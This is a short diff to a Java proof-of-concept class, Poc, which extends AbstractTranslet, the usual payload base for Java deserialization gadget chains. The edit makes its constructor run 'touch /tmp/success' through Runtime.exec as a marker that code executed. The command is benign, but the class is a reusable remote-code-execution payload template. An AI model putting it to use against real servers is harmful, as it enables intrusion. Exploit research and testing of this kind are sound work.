@@ -7,8 +7,9 @@ import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
 import java.io.IOException;
 
 public class Poc extends AbstractTranslet {
+
     public Poc() throws IOException {
-        Runtime.getRuntime().exec("exec");
+        Runtime.getRuntime().exec("touch /tmp/success");
     }
 
     @Override
